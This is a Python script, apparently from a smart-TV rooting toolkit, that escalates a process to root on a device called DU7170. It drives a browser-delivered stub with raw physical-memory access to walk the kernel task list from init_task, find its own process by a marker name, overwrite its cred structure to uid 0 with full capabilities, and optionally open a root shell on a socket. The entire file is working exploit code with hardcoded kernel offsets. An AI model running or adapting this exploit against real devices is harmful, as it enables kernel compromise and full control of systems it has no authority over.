"""DU7170-specific root: fork landmark, walk task list, patch cred.

Uses the measured DU7170 constants (PHYS_OFF 0xBC000000, init_task PA
0x0490F2C0).  Monkey-patches physmap.RAM_LO/RAM_HI for the DU7170 memory
layout before using the RPC.

Usage: python tools/root_du7170.py           # root the stub
       python tools/root_du7170.py --exec    # root + drop to shell
"""
import os
import struct
import sys
import time

# Patch physmap RAM bounds BEFORE importing anything that reads them at
# module level.  DU7170 RAM starts at 0x04000000.
os.environ.setdefault("TVPHYS_HI", hex(0x20000000))  # safe upper bound

import physmap as T

# Override the bounds the module hardcodes for the QNX1D.
T.RAM_LO = 0x04000000
T.RAM_HI = int(os.environ.get("TVPHYS_HI", hex(0x20000000)), 0)
T.IMAGE_BASES = [0x04008000]  # DU7170 kernel Image physical load address

# ── DU7170 kernel constants (measured) ────────────────────────────
V          = 0xBC000000       # VA = PA + V
INIT_TASK  = 0x0490F2C0       # PA of init_task (swapper/0)
O_TASKS    = 0x23C            # tasks list_head offset
O_PID      = 0x2E8
O_TGID     = 0x2EC
O_RPARENT  = 0x2F0
O_RCRED    = 0x3F4
O_CRED     = 0x3F8
O_COMM     = 0x400
OWNER_UID  = 5001
CAP_FULL_LO = 0xFFFFFFFF
CAP_FULL_HI = 0x0000003F

ABS  = lambda pa: (pa + V) & 0xFFFFFFFF
PHYS = lambda va: (va - V) & 0xFFFFFFFF

# ── Kernel Image signature (DU7170, first 8 bytes) ───────────────
# ARM Image: bl __hyp_stub_install ; mrs r9, cpsr
# (Exact bytes may differ per build, so also accept the relaxed ARM pattern.)
DU7170_SIG = None  # filled on first probe


def find_image_base(rpc):
    """Probe the DU7170 kernel Image at 0x04008000."""
    addr = 0x04008000
    try:
        got = rpc.read(addr, 8)
    except Exception as exc:
        print(f"[!] probe {addr:#010x} failed: {exc}", flush=True)
        return None
    u32 = lambda b, o=0: struct.unpack_from("<I", b, o)[0]
    # relaxed ARM Image: bl xxx ; mrs r9, cpsr
    if len(got) == 8 and (u32(got) & 0xFF000000) == 0xEB000000 and u32(got, 4) == 0xE10F9000:
        print(f"[+] ARM Image at {addr:#010x}", flush=True)
        return addr
    print(f"[!] no ARM Image at {addr:#010x}: {got.hex()}", flush=True)
    return None


def read_comm(rpc, task_pa):
    c = rpc.read(task_pa + O_COMM, 16)
    nul = c.find(b'\x00')
    return c[:nul] if nul >= 0 else c


def verify_init_task(rpc):
    """Read init_task comm — must start with 'swapper'."""
    comm = read_comm(rpc, INIT_TASK)
    name = comm.decode("ascii", errors="replace")
    print(f"[*] init_task (PA {INIT_TASK:#010x}) comm: '{name}'", flush=True)
    return comm.startswith(b"swapper")


def sane_cred(rpc, cred_va):
    """Check that a pointer looks like a real cred struct."""
    if not (0xC0000000 <= cred_va <= 0xFFFFFFFF) or (cred_va & 3):
        return False
    try:
        head = rpc.read(PHYS(cred_va), 36)
    except Exception:
        return False
    usage = struct.unpack_from("<I", head, 0)[0]
    ids = struct.unpack_from("<8I", head, 4)
    if usage > 0x10000:
        return False
    if any(v > 0x1000000 for v in ids):
        return False
    return ids[0] < 0x100000


def patch_cred(rpc, cred_va):
    """Zero uid..fsgid, set full caps.  Only patches uid 5001."""
    cred_pa = PHYS(cred_va)
    try:
        uid = T.u32(rpc.read(cred_pa + 4, 4))
    except Exception:
        return False
    if uid == 0:
        print(f"[*] cred {cred_va:#010x} already uid 0", flush=True)
        return True  # already done
    if uid != OWNER_UID:
        print(f"[-] cred {cred_va:#010x} uid={uid}, not ours", flush=True)
        return False
    # Zero 8 × u32 ids at +4
    for i in range(8):
        rpc.write32(cred_pa + 4 + i * 4, 0)
    # cap_permitted at +0x30, cap_effective at +0x38
    rpc.write32(cred_pa + 0x30, CAP_FULL_LO)
    rpc.write32(cred_pa + 0x34, CAP_FULL_HI)
    rpc.write32(cred_pa + 0x38, CAP_FULL_LO)
    rpc.write32(cred_pa + 0x3C, CAP_FULL_HI)
    # Verify
    ids = rpc.read(cred_pa + 4, 32)
    if any(b != 0 for b in ids):
        print("[!] cred verify FAILED", flush=True)
        return False
    print(f"[+] cred {cred_va:#010x} patched to uid=0 + full caps", flush=True)
    return True


def fork_pid(rpc):
    """Ask the stub to fork (op 6)."""
    rpc._cmd(6, 0, 0, 0)
    return struct.unpack("<i", rpc._recv_exact(4))[0]


def walk_tasks_back(rpc, want_comm, max_hops=2500):
    """Walk init_task.tasks.prev backwards, return (task_pa, parent_va) for
    the first task whose comm matches `want_comm`."""
    try:
        prev = T.u32(rpc.read(INIT_TASK + O_TASKS + 4, 4))
    except Exception as exc:
        print(f"[!] cannot read init tasks.prev: {exc}", flush=True)
        return None
    cur = prev
    init_va = ABS(INIT_TASK)
    for i in range(max_hops):
        task_va = (cur - O_TASKS) & 0xFFFFFFFF
        task_pa = PHYS(task_va)
        if task_pa == INIT_TASK:
            break
        try:
            comm = read_comm(rpc, task_pa)
        except Exception:
            break
        if comm.startswith(want_comm):
            parent_va = T.u32(rpc.read(task_pa + O_RPARENT, 4))
            return task_pa, parent_va, i
        try:
            cur = T.u32(rpc.read(task_pa + O_TASKS + 4, 4))
        except Exception:
            break
    return None


def find_tags_near_tail(rpc, tag, hops=400):
    """All tasks whose comm starts with `tag`, walking init.tasks.prev."""
    found = []
    head_va = ABS(INIT_TASK) + O_TASKS
    seen = set()
    try:
        cur = T.u32(rpc.read(INIT_TASK + O_TASKS + 4, 4))
    except Exception:
        return found
    for _ in range(hops):
        if not T._kernel_ptr(cur) or cur == head_va or cur in seen:
            break
        seen.add(cur)
        task_va = (cur - O_TASKS) & 0xFFFFFFFF
        task_pa = PHYS(task_va)
        try:
            comm = read_comm(rpc, task_pa)
        except Exception:
            break
        if comm.startswith(tag):
            found.append(task_va)
        try:
            cur = T.u32(rpc.read(task_pa + O_TASKS + 4, 4))
        except Exception:
            break
    return found


def find_fork_task(rpc, exclude=None, attempts=10, hops=200):
    """Find a PHYRFORK task near init's list tail."""
    exclude = exclude or set()
    for _ in range(attempts):
        try:
            cur = T.u32(rpc.read(INIT_TASK + O_TASKS + 4, 4))
        except Exception:
            time.sleep(0.1)
            continue
        for _ in range(hops):
            if not T._kernel_ptr(cur):
                break
            task_va = (cur - O_TASKS) & 0xFFFFFFFF
            try:
                comm = read_comm(rpc, PHYS(task_va))
            except Exception:
                break
            if comm.startswith(b"PHYRFORK") and task_va not in exclude:
                return task_va
            try:
                cur = T.u32(rpc.read(PHYS(task_va) + O_TASKS + 4, 4))
            except Exception:
                break
        time.sleep(0.1)
    return None


def root_via_fork(rpc, do_exec=False):
    """Fork a landmark child, find it, follow real_parent, patch the cred."""
    # Step 1: verify init_task
    if not verify_init_task(rpc):
        print("[-] init_task mismatch — wrong constants?", flush=True)
        return False

    # Step 2: find the kernel image (confirmation only)
    base = find_image_base(rpc)
    if base is None:
        print("[!] kernel Image not found at expected address — proceeding "
              "anyway (init_task verified)", flush=True)

    # Step 3: record pre-existing PHYRFORK orphans
    pre = set(find_tags_near_tail(rpc, b"PHYRFORK", 400))
    if pre:
        print(f"[*] {len(pre)} pre-existing PHYRFORK orphan(s)", flush=True)

    # Step 4: fork a landmark child
    pid = -1
    try:
        pid = fork_pid(rpc)
    except Exception as exc:
        print(f"[!] fork failed: {exc}", flush=True)
    print(f"[*] fork -> pid {pid}", flush=True)
    if pid <= 0:
        print("[-] fork returned no child", flush=True)
        return False

    time.sleep(0.15)  # let the child start

    # Step 5: find the forked child in the task list
    child_va = find_fork_task(rpc, exclude=pre)
    if child_va is None:
        print(f"[-] PHYRFORK child pid {pid} not found in task walk", flush=True)
        return False
    print(f"[+] PHYRFORK child at VA {child_va:#010x}", flush=True)

    # Step 6: find PHYSRPC1 targets (our parent task) near the tail
    for attempt in range(6):
        print(f"[*] attempt {attempt + 1}: scanning for PHYSRPC1", flush=True)
        targets = find_tags_near_tail(rpc, b"PHYSRPC1", 400)
        if not targets:
            # Fallback: read parent pointers from the child
            child_pa = PHYS(child_va)
            buf = rpc.read(child_pa, 0x800)
            for o in range(0, 0x800, 4):
                v = struct.unpack_from("<I", buf, o)[0]
                if not T._kernel_ptr(v):
                    continue
                try:
                    c = read_comm(rpc, PHYS(v))
                except Exception:
                    continue
                if c.startswith(b"PHYSRPC1"):
                    targets.append(v)

        if not targets:
            print("[-] no PHYSRPC1 found", flush=True)
            time.sleep(0.2)
            continue

        patched = already = False
        for parent_va in targets:
            print(f"[*] PHYSRPC1 at VA {parent_va:#010x}", flush=True)
            parent_pa = PHYS(parent_va)
            for off in (O_CRED, O_RCRED):
                cred_va = T.u32(rpc.read(parent_pa + off, 4))
                if not sane_cred(rpc, cred_va):
                    print(f"[-] skip {cred_va:#010x} (not a sane cred)", flush=True)
                    continue
                uid = T.u32(rpc.read(PHYS(cred_va) + 4, 4))
                if uid == 0:
                    already = True
                    continue
                if uid != OWNER_UID:
                    print(f"[-] skip {cred_va:#010x} uid={uid}", flush=True)
                    continue
                if patch_cred(rpc, cred_va):
                    patched = True

        if patched:
            print("[+] ✓ ROOTED — stub is now uid 0 with full caps", flush=True)
            if do_exec:
                print("[*] sending EXEC (root shell on socket)", flush=True)
                rpc.exec_shell()
            return True
        if already:
            print("[!] only uid-0 creds found — stale pointer, not proof of "
                  "root. Reload the page.", flush=True)
            return False
        time.sleep(0.2)

    print("[-] failed after retries", flush=True)
    return False


def main():
    rpc = T.RPC(timeout=20)
    try:
        ok = root_via_fork(rpc, do_exec="--exec" in sys.argv)
        if ok:
            print("\n[+] SUCCESS — the physmap stub is now running as root.",
                  flush=True)
            print("    Next: deploy with run_root.py or auto_root.py",
                  flush=True)
        else:
            print("\n[-] Root failed. Close the TV browser, reopen it, load "
                  "the page again, and retry.", flush=True)
        sys.exit(0 if ok else 1)
    finally:
        rpc.close()


if __name__ == "__main__":
    main()
